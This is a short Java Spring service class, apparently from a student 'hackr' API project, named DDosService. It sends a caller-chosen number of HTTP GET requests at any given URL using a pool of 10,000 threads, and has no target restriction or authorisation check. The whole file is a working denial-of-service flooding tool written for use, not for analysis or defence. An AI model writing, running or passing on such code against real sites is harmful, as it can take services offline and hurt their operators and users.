package mds.tp.api.hackr.services;

import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Service
public class DDosService {

    public void ddos(final String url, final Integer nbRequest) {
        RestTemplate restTemplate = new RestTemplate();
        ExecutorService executor = Executors.newFixedThreadPool(10000);

        for (int i = 0; i < nbRequest; i++) {
            executor.submit(() -> {
                try {
                    restTemplate.getForEntity(url, String.class);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            });
        }
        executor.shutdown();
    }
}
